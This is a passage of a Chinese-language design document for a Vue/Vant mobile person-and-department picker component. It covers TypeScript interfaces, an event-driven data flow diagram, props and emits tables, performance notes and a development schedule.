<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">RoleInfo</span> {
  <span class="hljs-attr">roleId</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">roleName</span>: <span class="hljs-built_in">string</span>;
  [<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>]: <span class="hljs-built_in">any</span>;
}

<span class="hljs-comment">// 群组信息</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">GroupInfo</span> {
  <span class="hljs-attr">groupId</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">groupName</span>: <span class="hljs-built_in">string</span>;
  [<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>]: <span class="hljs-built_in">any</span>;
}

<span class="hljs-comment">// 通用选择项（适配Vant组件）</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">SelectOption</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>;            <span class="hljs-comment">// 对应Vant的value</span>
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;          <span class="hljs-comment">// 对应Vant的text</span>
  <span class="hljs-attr">type</span>: <span class="hljs-title class_">SelectItemType</span>;
  hasChildren?: <span class="hljs-built_in">boolean</span>; <span class="hljs-comment">// 是否有下级数据</span>
  disabled?: <span class="hljs-built_in">boolean</span>;    <span class="hljs-comment">// 是否禁用</span>
  [<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>]: <span class="hljs-built_in">any</span>;
}

<span class="hljs-comment">// 已选结果</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">SelectedResult</span> {
  <span class="hljs-attr">users</span>: <span class="hljs-title class_">UserInfo</span>[];
  <span class="hljs-attr">depts</span>: <span class="hljs-title class_">DeptInfo</span>[];
  <span class="hljs-attr">roles</span>: <span class="hljs-title class_">RoleInfo</span>[];
  <span class="hljs-attr">groups</span>: <span class="hljs-title class_">GroupInfo</span>[];
  <span class="hljs-attr">quickContacts</span>: <span class="hljs-title class_">UserInfo</span>[];
}


<span class="hljs-comment">// 组件Props</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">SelectPersonDeptProps</span> {
  <span class="hljs-attr">modelValue</span>: <span class="hljs-title class_">SelectedResult</span>;       <span class="hljs-comment">// 已选结果（用于回显和双向绑定）</span>
  visible?: <span class="hljs-built_in">boolean</span>;               <span class="hljs-comment">// 组件显示状态</span>
  tabs?: <span class="hljs-title class_">TabConfig</span>[];              <span class="hljs-comment">// 标签配置</span>
  multiple?: <span class="hljs-built_in">boolean</span>;              <span class="hljs-comment">// 是否多选，true=多选，false=单选</span>
  placeholder?: <span class="hljs-built_in">string</span>;            <span class="hljs-comment">// 搜索框占位符</span>
  showSelectedList?: <span class="hljs-built_in">boolean</span>;      <span class="hljs-comment">// 是否显示已选列表</span>
  showConfirmBtn?: <span class="hljs-built_in">boolean</span>;        <span class="hljs-comment">// 是否显示确认按钮</span>
  confirmBtnText?: <span class="hljs-built_in">string</span>;         <span class="hljs-comment">// 确认按钮文本</span>
  cancelBtnText?: <span class="hljs-built_in">string</span>;          <span class="hljs-comment">// 取消按钮文本</span>
  currentList?: <span class="hljs-title class_">SelectOption</span>[];    <span class="hljs-comment">// 当前列表数据</span>
  loading?: <span class="hljs-built_in">boolean</span>;               <span class="hljs-comment">// 加载状态</span>
  customUserList?: <span class="hljs-title class_">UserInfo</span>[];     <span class="hljs-comment">// 自定义用户列表</span>

}

<span class="hljs-comment">// 组件事件</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">SelectPersonDeptEmits</span> {
  <span class="hljs-string">'update:modelValue'</span>: [<span class="hljs-attr">value</span>: <span class="hljs-title class_">SelectedResult</span>]; <span class="hljs-comment">// 已选结果变化</span>
  <span class="hljs-string">'update:visible'</span>: [<span class="hljs-attr">visible</span>: <span class="hljs-built_in">boolean</span>];         <span class="hljs-comment">// 组件显示状态变化</span>
  <span class="hljs-string">'confirm'</span>: [<span class="hljs-attr">value</span>: <span class="hljs-title class_">SelectedResult</span>];           <span class="hljs-comment">// 确认选择</span>
  <span class="hljs-string">'cancel'</span>: [];                                <span class="hljs-comment">// 取消选择</span>
  <span class="hljs-string">'search'</span>: [<span class="hljs-attr">keyword</span>: <span class="hljs-built_in">string</span>];                  <span class="hljs-comment">// 搜索</span>
  <span class="hljs-string">'tab-change'</span>: [<span class="hljs-attr">tab</span>: <span class="hljs-title class_">SelectItemType</span>];         <span class="hljs-comment">// 标签切换</span>
  <span class="hljs-string">'next-level'</span>: [<span class="hljs-attr">item</span>: <span class="hljs-title class_">SelectOption</span>];          <span class="hljs-comment">// 点击下级按钮</span>
  <span class="hljs-string">'back-level'</span>: [<span class="hljs-attr">breadcrumb</span>: <span class="hljs-title class_">Array</span>&lt;{ <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>; <span class="hljs-attr">id</span>: <span class="hljs-built_in">string</span>; <span class="hljs-attr">type</span>: <span class="hljs-title class_">SelectItemType</span> }&gt;]; <span class="hljs-comment">// 返回上一级</span>
  <span class="hljs-string">'load-data'</span>: [<span class="hljs-attr">tab</span>: <span class="hljs-title class_">SelectItemType</span>, params?: <span class="hljs-built_in">any</span>]; <span class="hljs-comment">// 请求加载数据</span>
  <span class="hljs-string">'load-quick-search'</span>: [];                     <span class="hljs-comment">// 请求加载快速查找数据</span>
  <span class="hljs-string">'select-all'</span>: [<span class="hljs-attr">checked</span>: <span class="hljs-built_in">boolean</span>];            <span class="hljs-comment">// 全选/取消全选</span>
  <span class="hljs-string">'close'</span>: [];                                 <span class="hljs-comment">// 关闭组件</span>
}
</code></pre>
<pre><code class="hljs language-js" lang="js">
&lt;template&gt;
  &lt;<span class="hljs-title class_">SelectPersonDept</span>&lt;<span class="hljs-title class_">MyCustomType</span>&gt;
    :tabs=<span class="hljs-string">"customTabs"</span>
    @tab-change=<span class="hljs-string">"handleTabChange"</span>
  /&gt;
&lt;/template&gt;

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"ts"</span>&gt;</span><span class="javascript">
type <span class="hljs-title class_">MyCustomType</span> = <span class="hljs-string">'user1'</span> | <span class="hljs-string">'user2'</span> | <span class="hljs-string">'dept'</span> | <span class="hljs-string">'role'</span>;

<span class="hljs-keyword">const</span> customTabs = [
  { <span class="hljs-attr">tab</span>: <span class="hljs-string">'user1'</span>, <span class="hljs-attr">tab_name</span>: <span class="hljs-string">'普通用户'</span>, <span class="hljs-attr">uniKey</span>: <span class="hljs-string">'user1'</span> },
  { <span class="hljs-attr">tab</span>: <span class="hljs-string">'user2'</span>, <span class="hljs-attr">tab_name</span>: <span class="hljs-string">'VIP用户'</span>, <span class="hljs-attr">uniKey</span>: <span class="hljs-string">'user2'</span> },
  { <span class="hljs-attr">tab</span>: <span class="hljs-string">'dept'</span>, <span class="hljs-attr">tab_name</span>: <span class="hljs-string">'部门'</span>, <span class="hljs-attr">uniKey</span>: <span class="hljs-string">'dept'</span> },
  { <span class="hljs-attr">tab</span>: <span class="hljs-string">'role'</span>, <span class="hljs-attr">tab_name</span>: <span class="hljs-string">'角色'</span>, <span class="hljs-attr">uniKey</span>: <span class="hljs-string">'role'</span> }
] <span class="hljs-keyword">as</span> <span class="hljs-keyword">const</span>;

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleTabChange</span> = (<span class="hljs-params">tab: MyCustomType</span>) =&gt; {
  <span class="hljs-comment">// 获得完整的类型提示</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Tab changed:'</span>, tab);
};
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
</code></pre>
<h3 data-id="heading-9">4. 移动端纯UI组件设计（SelectPersonDeptMobile）</h3>
<h4 data-id="heading-10">4.1 组件定位</h4>
<ul>
<li><strong>纯UI组件</strong>：仅负责界面渲染和用户交互</li>
<li><strong>数据驱动</strong>：所有数据由父组件通过props传入</li>
<li><strong>事件驱动</strong>：通过事件与父组件通信，触发数据获取等操作</li>
<li><strong>可复用</strong>：适用于各种需要选人/选部门的移动端场景</li>
</ul>
<h4 data-id="heading-11">4.2 核心设计原则</h4>
<ul>
<li><strong>UI与数据分离</strong>：组件不包含任何数据获取逻辑</li>
<li><strong>事件驱动通信</strong>：通过事件通知父组件执行数据操作</li>
<li><strong>单向数据流</strong>：数据从父组件流向子组件，变化通过事件反馈</li>
<li><strong>灵活配置</strong>：支持通过props自定义各种行为和样式</li>
</ul>
<h3 data-id="heading-12">5. 数据获取渲染流程</h3>
<h4 data-id="heading-13">5.1 完整流程概览</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant 父组件
    participant 纯UI组件
    participant API接口
    
    %% 0. 回显数据初始化（新增）
    父组件-&gt;&gt;父组件: A. 准备初始已选数据（回显数据）
    父组件-&gt;&gt;纯UI组件: B. 传入初始modelValue（已选数据）
    
    %% 1. 组件初始化与显示
    父组件-&gt;&gt;纯UI组件: 1. 设置 visible=true
    纯UI组件-&gt;&gt;纯UI组件: 2. 组件渲染显示
    
    %% 2. 初始数据加载
    父组件-&gt;&gt;API接口: 3. 调用默认标签数据接口
    API接口--&gt;&gt;父组件: 4. 返回列表数据
    父组件-&gt;&gt;纯UI组件: 5. 更新 currentList props
    纯UI组件-&gt;&gt;纯UI组件: 6. 渲染列表数据并根据本地选中状态标记已选项
    纯UI组件-&gt;&gt;纯UI组件: 7. 根据modelValue更新本地选中状态（回显处理）
    
    %% 3. 用户交互：标签切换
    纯UI组件-&gt;&gt;父组件: 8. 触发 tab-change 事件 (新标签)
    父组件-&gt;&gt;API接口: 9. 调用新标签数据接口
    API接口--&gt;&gt;父组件: 10. 返回新标签数据
    父组件-&gt;&gt;纯UI组件: 11. 更新 currentList props
    纯UI组件-&gt;&gt;纯UI组件: 12. 渲染新标签数据并标记已选项
    
    %% 4. 用户交互：搜索
    纯UI组件-&gt;&gt;父组件: 19. 触发 search 事件 (关键词)
    父组件-&gt;&gt;API接口: 20. 调用搜索接口
    API接口--&gt;&gt;父组件: 21. 返回搜索结果
    父组件-&gt;&gt;纯UI组件: 22. 更新 currentList props
    纯UI组件-&gt;&gt;纯UI组件: 23. 渲染搜索结果并标记已选项
    
    %% 5. 用户交互：点击下级按钮
    纯UI组件-&gt;&gt;父组件: 24. 触发 next-level 事件 (item)
    父组件-&gt;&gt;API接口: 25. 调用下级数据接口
    API接口--&gt;&gt;父组件: 26. 返回下级数据
    父组件-&gt;&gt;纯UI组件: 27. 更新 currentList props
    纯UI组件-&gt;&gt;纯UI组件: 28. 渲染下级数据并标记已选项
    
    %% 6. 用户交互：返回上一级
    纯UI组件-&gt;&gt;父组件: 29. 触发 back-level 事件 (breadcrumb)
    父组件-&gt;&gt;API接口: 30. 调用上一级数据接口
    API接口--&gt;&gt;父组件: 31. 返回上一级数据
    父组件-&gt;&gt;纯UI组件: 32. 更新 currentList props
    纯UI组件-&gt;&gt;纯UI组件: 33. 渲染上一级数据并标记已选项
    
    %% 7. 用户交互：选择项
    纯UI组件-&gt;&gt;父组件: 34. 触发 select 事件 (item, checked)
    父组件-&gt;&gt;父组件: 35. 处理选择逻辑，更新已选结果
    父组件-&gt;&gt;纯UI组件: 36. 更新 modelValue props
    纯UI组件-&gt;&gt;纯UI组件: 37. 更新本地选中状态和已选列表显示
    
    %% 8. 组件关闭
    纯UI组件-&gt;&gt;父组件: 38. 触发 confirm/cancel 事件
    父组件-&gt;&gt;父组件: 39. 处理最终结果
    父组件-&gt;&gt;纯UI组件: 40. 设置 visible=false
    纯UI组件-&gt;&gt;纯UI组件: 41. 组件隐藏
</code></pre>
<h4 data-id="heading-14">5.2 详细流程说明</h4>
<h5 data-id="heading-15">5.2.0 0. 回显数据初始化（新增）</h5>
<p><strong>触发条件</strong>：父组件准备使用组件并需要显示已选数据时</p>
<p><strong>数据流向</strong>：</p>
<ol>
<li>父组件根据业务需求准备初始已选数据（回显数据）</li>
<li>父组件将初始已选数据通过 <code>modelValue</code> props传入纯UI组件</li>
<li>纯UI组件在初始化时接收 <code>modelValue</code></li>
</ol>
<p><strong>交互说明</strong>：</p>
<ul>
<li>回显数据可以是来自API请求、表单数据或其他业务逻辑</li>
<li>父组件需要确保回显数据格式符合 <code>SelectedResult</code> 接口定义</li>
<li>支持空回显数据（初始未选择任何项）</li>
</ul>
<h5 data-id="heading-16">5.2.1 1. 组件初始化与显示</h5>
<p><strong>触发条件</strong>：父组件需要打开选人组件时</p>
<p><strong>数据流向</strong>：</p>
<ol>
<li>父组件通过设置 <code>visible=true</code> 打开组件</li>
<li>纯UI组件渲染并显示</li>
<li>纯UI组件根据传入的 <code>modelValue</code> 更新本地选中状态（回显处理核心逻辑）</li>
</ol>
<p><strong>交互说明</strong>：</p>
<ul>
<li>组件打开时自动处理回显数据，并同步选中状态</li>
<li>支持通过props预设初始数据，避免白屏</li>
</ul>
<h5 data-id="heading-17">5.2.2 2. 初始数据加载</h5>
<p><strong>触发条件</strong>：组件打开后</p>
<p><strong>数据流向</strong>：</p>
<ol>
<li>父组件根据事件类型调用对应API接口</li>
<li>API返回数据后，父组件通过props更新到纯UI组件</li>
<li>纯UI组件接收到新数据后渲染</li>
<li>纯UI组件根据本地保存的选中状态，自动标记列表中的已选项（回显显示）</li>
</ol>
<p><strong>交互说明</strong>：</p>
<ul>
<li>父组件负责处理API调用和数据转换</li>
<li>支持设置 <code>loading</code> 状态，显示加载动画</li>
<li>支持处理空数据</li>
<li>数据加载完成后自动显示已选项标记，实现回显效果</li>
</ul>
<h5 data-id="heading-18">5.2.3 3. 标签切换数据加载</h5>
<p><strong>触发条件</strong>：用户点击不同标签时</p>
<p><strong>数据流向</strong>：</p>
<ol>
<li>纯UI组件触发 <code>tab-change</code> 事件，携带当前标签类型</li>
<li>父组件根据标签类型调用对应API接口</li>
<li>API返回数据后，父组件通过 <code>currentList</code> props更新</li>
<li>纯UI组件重新渲染对应标签的数据</li>
<li>纯UI组件根据本地保存的选中状态，自动标记列表中的已选项（回显显示）</li>
</ol>
<p><strong>交互说明</strong>：</p>
<ul>
<li>标签切换时自动重置面包屑</li>
<li>支持不同标签使用不同的API接口</li>
<li>标签切换时显示加载状态</li>
<li>不同标签下的数据会自动根据全局选中状态标记已选项</li>
</ul>
<h5 data-id="heading-19">5.2.4 4. 搜索数据加载</h5>
<p><strong>触发条件</strong>：用户在搜索框输入关键词时</p>
<p><strong>数据流向</strong>：</p>
<ol>
<li>纯UI组件触发 <code>search</code> 事件，携带搜索关键词</li>
<li>父组件调用搜索API接口</li>
<li>API返回搜索结果后，父组件通过 <code>currentList</code> props更新</li>
<li>纯UI组件渲染搜索结果</li>
<li>纯UI组件根据本地保存的选中状态，自动标记搜索结果中的已选项（回显显示）</li>
</ol>
<p><strong>交互说明</strong>：</p>
<ul>
<li>支持实时搜索或防抖搜索</li>
<li>搜索结果为空时显示空状态</li>
<li>支持清空搜索条件，返回原始列表</li>
<li>搜索结果中会自动标记已选项，保持回显状态</li>
</ul>
<h5 data-id="heading-20">5.2.5 5. 下级数据加载</h5>
<p><strong>触发条件</strong>：用户点击列表项右侧的"下级"按钮时</p>
<p><strong>数据流向</strong>：</p>
<ol>
<li>纯UI组件触发 <code>next-level</code> 事件，携带当前项信息</li>
<li>父组件调用获取下级数据的API接口</li>
<li>API返回下级数据后，父组件通过 <code>currentList</code> props更新</li>
<li>纯UI组件渲染下级数据</li>
<li>同时更新面包屑导航</li>
<li>纯UI组件根据本地保存的选中状态，自动标记下级数据中的已选项（回显显示）</li>
</ol>
<p><strong>交互说明</strong>：</p>
<ul>
<li>仅当列表项 <code>hasChildren=true</code> 时显示"下级"按钮</li>
<li>点击后自动更新面包屑，便于返回</li>
<li>支持多级嵌套导航</li>
<li>下级数据中会自动标记已选项，保持回显状态</li>
</ul>
<h5 data-id="heading-21">5.2.6 6. 返回上一级数据加载</h5>
<p><strong>触发条件</strong>：用户点击"返回上一级"按钮或面包屑项时</p>
<p><strong>数据流向</strong>：</p>
<ol>
<li>纯UI组件触发 <code>back-level</code> 事件，携带当前面包屑信息</li>
<li>父组件调用获取上一级数据的API接口</li>
<li>API返回上一级数据后，父组件通过 <code>currentList</code> props更新</li>
<li>纯UI组件渲染上一级数据</li>
<li>同时更新面包屑导航</li>
<li>纯UI组件根据本地保存的选中状态，自动标记上一级数据中的已选项（回显显示）</li>
</ol>
<p><strong>交互说明</strong>：</p>
<ul>
<li>支持通过面包屑直接跳转到任意层级</li>
<li>面包屑项支持点击事件</li>
<li>无上级数据时自动隐藏返回按钮</li>
<li>上一级数据中会自动标记已选项，保持回显状态</li>
</ul>
<h5 data-id="heading-22">5.2.7 7. 选择项处理</h5>
<p><strong>触发条件</strong>：用户点击选择框（Checkbox/Radio）时</p>
<p><strong>数据流向</strong>：</p>
<ol>
<li>纯UI组件触发 <code>select</code> 事件，携带选择项和选中状态</li>
<li>父组件根据选择状态更新已选结果</li>
<li>父组件通过 <code>modelValue</code> props更新已选结果</li>
<li>纯UI组件更新已选列表显示</li>
</ol>
<p><strong>交互说明</strong>：</p>
<ul>
<li>支持多选和单选模式</li>
<li>支持全选/取消全选功能</li>
<li>实时更新已选列表</li>
</ul>
<h5 data-id="heading-23">5.2.8 8. 组件关闭</h5>
<p><strong>触发条件</strong>：用户点击"确认"或"取消"按钮时</p>
<p><strong>数据流向</strong>：</p>
<ol>
<li>纯UI组件触发 <code>confirm</code> 或 <code>cancel</code> 事件</li>
<li>父组件处理最终结果（保存或丢弃）</li>
<li>父组件设置 <code>visible=false</code> 关闭组件</li>
<li>纯UI组件隐藏</li>
</ol>
<p><strong>交互说明</strong>：</p>
<ul>
<li>确认时返回最终已选结果</li>
<li>取消时不保存任何更改</li>
</ul>
<h5 data-id="heading-24">5.2.9 9. 虚拟滚动</h5>
<p>针对大数据量（如10000+条人员数据）的情况，我从后端、前端和交互体验三个层面设计了完整的优化策略：</p>
<h6 data-id="heading-25">1. 后端层面：分页查询是基础</h6>
<ul>
<li>接口必须支持分页，默认每页返回20-50条数据</li>
<li>包含page（当前页码）、size（每页条数）和total（总条数）参数</li>
<li>示例请求：api.loadData(tab, { page: 1, size: 30 })</li>
<li>确保分页查询的性能，建议对查询字段建立索引</li>
</ul>
<h6 data-id="heading-26">2. 前端层面：虚拟滚动是核心</h6>
<ul>
<li>
<p>使用Vant的List组件实现虚拟滚动，只渲染可视区域内的列表项</p>
</li>
<li>
<p>配置预加载偏移量（50-100px），提前加载下一页数据</p>
</li>
<li>
<p>示例代码：</p>
<pre><code class="hljs language-ini" lang="ini">Vue
&lt;van-list
  v-model:<span class="hljs-attr">loading</span>=<span class="hljs-string">"loading"</span>
  :<span class="hljs-attr">finished</span>=<span class="hljs-string">"finished"</span>
  @<span class="hljs-attr">load</span>=<span class="hljs-string">"onLoad"</span>
  :<span class="hljs-attr">offset</span>=<span class="hljs-string">"50"</span>
&gt;
  &lt;van-cell
    <span class="hljs-attr">v-for</span>=<span class="hljs-string">"item in currentList"</span>
    :<span class="hljs-attr">key</span>=<span class="hljs-string">"item.id"</span>
    :<span class="hljs-attr">title</span>=<span class="hljs-string">"item.name"</span>
  &gt;
    &lt;!-- 列表项内容 --&gt;
  &lt;/van-cell&gt;
&lt;/van-list&gt;
</code></pre>
</li>
</ul>
<h6 data-id="heading-27">3. 搜索优化：减少不必要的请求</h6>
<ul>
<li>
<p>200-300ms防抖处理，避免频繁输入导致的多次请求</p>
</li>
<li>
<p>搜索关键词长度限制（至少2个字符）</p>
</li>
<li>
<p>搜索结果支持分页加载</p>
</li>
<li>
<p>示例代码：</p>
<pre><code class="hljs language-ini" lang="ini">TypeScript
const <span class="hljs-attr">debouncedSearch</span> = debounce
((keyword: string) =&gt; {
  if (keyword.trim().length &gt;= 2) {
    handleSearch(keyword)<span class="hljs-comment">;</span>
  }
}, 300)<span class="hljs-comment">;</span>
</code></pre>
</li>
</ul>
<h4 data-id="heading-28">5.3 事件与Props映射关系</h4>



























































<table><thead><tr><th>事件名</th><th>触发时机</th><th>对应Props更新</th><th>说明</th></tr></thead><tbody><tr><td><code>tab-change</code></td><td>标签切换</td><td><code>currentList</code></td><td>切换标签时触发</td></tr><tr><td><code>search</code></td><td>搜索输入</td><td><code>currentList</code></td><td>搜索关键词变化时触发</td></tr><tr><td><code>next-level</code></td><td>点击下级按钮</td><td><code>currentList</code></td><td>加载下级数据</td></tr><tr><td><code>back-level</code></td><td>返回上一级</td><td><code>currentList</code></td><td>加载上一级数据</td></tr><tr><td><code>select</code></td><td>选择/取消选择</td><td><code>modelValue</code></td><td>更新已选结果</td></tr><tr><td><code>confirm</code></td><td>确认选择</td><td>-</td><td>确认最终结果</td></tr><tr><td><code>cancel</code></td><td>取消选择</td><td>-</td><td>取消选择</td></tr><tr><td>-</td><td>组件初始化</td><td><code>modelValue</code></td><td>父组件传入回显数据，纯UI组件处理并更新本地选中状态</td></tr></tbody></table>
<h4 data-id="heading-29">5.4 父组件核心职责</h4>
<ol>
<li>
<p><strong>数据管理</strong>：</p>
<ul>
<li>调用API获取各种数据</li>
<li>处理数据转换和格式化</li>
<li>维护已选结果状态</li>
<li>准备和管理回显数据（初始已选数据）</li>
</ul>
</li>
<li>
<p><strong>事件处理</strong>：</p>
<ul>
<li>监听纯UI组件发出的所有事件</li>
<li>根据事件类型执行对应逻辑</li>
<li>更新组件props</li>
<li>处理回显数据的初始化和更新</li>
</ul>
</li>
<li>
<p><strong>数据缓存策略</strong>：</p>
</li>
</ol>
<ul>
<li>
<p>使用Map数据结构缓存已加载的数据</p>
<ul>
<li>
<p>高效的查找性能 ：Map的查找时间复杂度为O(1)，比数组遍历更高效</p>
</li>
<li>
<p>灵活的键类型 ：可以使用复合字符串作为键，便于区分不同tab和参数组合的数据</p>
</li>
<li>
<p>避免重复请求 ：切换tab或返回上一级时，直接从缓存获取数据，减少API调用次数</p>
</li>
<li>
<p>提升用户体验 ：缓存数据可立即显示，避免加载等待，提升交互流畅度</p>
</li>
</ul>
</li>
<li>
<p>组件关闭时清空缓存</p>
<ul>
<li>避免内存泄漏 ：长时间不清除缓存可能导致内存占用过高</li>
<li>数据时效性 ：确保下次打开组件时获取最新数据</li>
<li>减少不必要的资源占用 ：组件不再使用时释放相关资源</li>
<li>避免数据不一致 ：防止缓存数据与实际业务数据不一致</li>
</ul>
</li>
</ul>
<h4 data-id="heading-30">5.5 纯UI组件核心职责</h4>
<ol>
<li>
<p><strong>界面渲染</strong>：</p>
<ul>
<li>根据props渲染列表数据</li>
<li>渲染已选列表</li>
<li>渲染加载状态和空状态</li>
<li>根据回显数据标记已选项</li>
</ul>
</li>
<li>
<p><strong>用户交互</strong>：</p>
<ul>
<li>处理用户点击、滑动等操作</li>
<li>维护本地临时状态（如选中状态）</li>
<li>触发相应事件</li>
</ul>
</li>
<li>
<p><strong>状态同步</strong>：</p>
<ul>
<li>响应props变化，更新UI</li>
<li>保持与父组件数据一致</li>
<li>处理回显数据：将modelValue转换为本地选中状态</li>
<li>在数据加载完成后，根据本地选中状态标记已选项</li>
</ul>
</li>
</ol>
<h3 data-id="heading-31">6. 组件API</h3>
<h4 data-id="heading-32">6.1 Props</h4>

























































































<table><thead><tr><th>参数名</th><th>类型</th><th>默认值</th><th>说明</th></tr></thead><tbody><tr><td>v-model</td><td><code>SelectedResult</code></td><td>-</td><td>双向绑定的已选结果</td></tr><tr><td>v-model:visible</td><td><code>boolean</code></td><td><code>false</code></td><td>控制组件显示/隐藏</td></tr><tr><td>tabs</td><td><code>TabConfig[]</code></td><td>见默认配置</td><td>标签配置，包含快速查找项</td></tr><tr><td>multiple</td><td><code>boolean</code></td><td><code>true</code></td><td>是否支持多选，<strong>true=多选，false=单选</strong></td></tr><tr><td>placeholder</td><td><code>string</code></td><td><code>'请输入搜索关键词'</code></td><td>搜索框占位符</td></tr><tr><td>showSelectedList</td><td><code>boolean</code></td><td><code>true</code></td><td>是否显示已选列表</td></tr><tr><td>showConfirmBtn</td><td><code>boolean</code></td><td><code>true</code></td><td>是否显示确认按钮</td></tr><tr><td>confirmBtnText</td><td><code>string</code></td><td><code>'确认'</code></td><td>确认按钮文本</td></tr><tr><td>cancelBtnText</td><td><code>string</code></td><td><code>'取消'</code></td><td>取消按钮文本</td></tr><tr><td>currentList</td><td><code>SelectOption[]</code></td><td><code>[]</code></td><td>当前列表数据</td></tr><tr><td>loading</td><td><code>boolean</code></td><td><code>false</code></td><td>加载状态</td></tr><tr><td>lowcodeStoreId</td><td><code>string</code></td><td><code>''</code></td><td>低代码存储ID</td></tr><tr><td>customUserList</td><td><code>UserInfo[]</code></td><td><code>[]</code></td><td>自定义用户列表</td></tr></tbody></table>
<h4 data-id="heading-33">6.2 Emits</h4>




























































<table><thead><tr><th>事件名</th><th>类型</th><th>说明</th></tr></thead><tbody><tr><td>update:modelValue</td><td><code>(value: SelectedResult) =&gt; void</code></td><td>已选结果变化时触发</td></tr><tr><td>update:visible</td><td><code>(visible: boolean) =&gt; void</code></td><td>组件显示状态变化时触发</td></tr><tr><td>confirm</td><td><code>(value: SelectedResult) =&gt; void</code></td><td>确认选择时触发</td></tr><tr><td>cancel</td><td><code>() =&gt; void</code></td><td>取消选择时触发</td></tr><tr><td>search</td><td><code>(keyword: string) =&gt; void</code></td><td>搜索时触发，携带搜索关键词</td></tr><tr><td>tab-change</td><td><code>(tab: SelectItemType) =&gt; void</code></td><td>标签切换时触发，携带标签类型</td></tr><tr><td>next-level</td><td><code>(item: SelectOption) =&gt; void</code></td><td>点击下级按钮时触发，携带当前项信息</td></tr><tr><td>back-level</td><td><code>(breadcrumb: Array&lt;{ name: string; id: string; type: SelectItemType }&gt;) =&gt; void</code></td><td>返回上一级时触发，携带面包屑信息</td></tr><tr><td>select-all</td><td><code>(checked: boolean) =&gt; void</code></td><td>全选/取消全选时触发，携带选中状态</td></tr><tr><td>close</td><td><code>() =&gt; void</code></td><td>关闭组件时触发</td></tr></tbody></table>
<h3 data-id="heading-34">7. 工时表</h3>

















































































































<table><thead><tr><th>日期</th><th>任务名称</th><th>详细工作内容</th><th>优先级</th><th>计划工时（h）</th></tr></thead><tbody><tr><td>第1天</td><td>组件结构搭建</td><td>1. 创建组件目录结构<br/>2. 创建主组件文件<br/>3. 搭建基础布局框架</td><td>高</td><td>8</td></tr><tr><td>第2天</td><td>子组件开发（搜索栏+标签）</td><td>1. 开发SearchBar搜索栏组件<br/>2. 开发TabNav标签导航组件<br/>3. 集成子组件到主组件<br/>4. 实现搜索和标签切换事件</td><td>高</td><td>8</td></tr><tr><td>第3天</td><td>平铺列表核心功能</td><td>1. 开发SelectList平铺列表组件<br/>2. 实现列表项渲染<br/>3. 开发"下级"按钮功能<br/>4. 实现面包屑导航</td><td>高</td><td>8</td></tr><tr><td>第4天</td><td>选择功能实现</td><td>1. 实现单选/多选逻辑<br/>2. 开发选择状态管理<br/>3. 实现全选/取消全选功能<br/>4. 集成到列表组件</td><td>高</td><td>8</td></tr><tr><td>第5天</td><td>已选列表开发</td><td>1. 开发SelectedList已选列表组件<br/>2. 实现已选项展示<br/>3. 开发已选项删除功能<br/>4. 集成到主组件</td><td>中</td><td>8</td></tr><tr><td>第6天</td><td>快速查找功能</td><td>1. 开发快速查找模块<br/>4. 集成到主组件</td><td>中</td><td>8</td></tr><tr><td>第7天</td><td>回显数据逻辑</td><td>1. 实现modelValue双向绑定<br/>2. 开发回显数据处理<br/>3. 实现本地选中状态管理<br/></td><td>高</td><td>8</td></tr><tr><td>第8天</td><td>组件集成与调试</td><td>1. 整合所有子组件<br/>2. 调试组件间通信<br/>3. 修复发现的问题</td><td>高</td><td>8</td></tr><tr><td>第9天</td><td>单个旧组件替换并调试</td><td>1. 接口联调<br/>2. 重构原有功能点<br/></td><td>高</td><td>8</td></tr><tr><td>第10天</td><td>单个旧组件替换并调试</td><td>1. 接口联调<br/>2. 重构原有功能点<br/></td><td>高</td><td>8</td></tr><tr><td>第11天</td><td>单个旧组件替换并调试</td><td>1. 测试移动端适配<br/>2. 修复测试中发现的问题</td><td>中</td><td>8</td><td/><td>中</td><td>8</td></tr><tr><td>第12天</td><td>所有旧组件替换并调试</td><td>1. 接口联调<br/>2. 重构原有功能点<br/></td><td>中</td><td>8</td></tr><tr><td>第13天</td><td>所有旧组件替换并调试</td><td>1. 接口联调<br/>2. 重构原有功能点<br/></td><td>中</td><td>8</td></tr><tr><td>第14天</td><td>所有旧组件替换并调试</td><td>1. 测试移动端适配<br/>2. 修复测试中发现的问题</td><td>中</td><td>8</td></tr></tbody></table>
<h3 data-id="heading-35">8. 总结</h3>
<p><code>SelectPersonDeptMobile</code> 是一个基于Vant的纯UI移动端公共选人/选部门组件，通过事件驱动的方式与父组件通信，实现了UI与数据逻辑的分离。组件支持多种选择类型、搜索功能、多级嵌套导航和灵活的配置选项，能够适应各种业务场景。</p>
<p>通过清晰的数据流向和交互流程设计，组件实现了高效的数据流管理和良好的用户体验。父组件负责数据获取和业务逻辑，纯UI组件负责界面渲染和用户交互，两者分工明确，便于维护和扩展。</p>
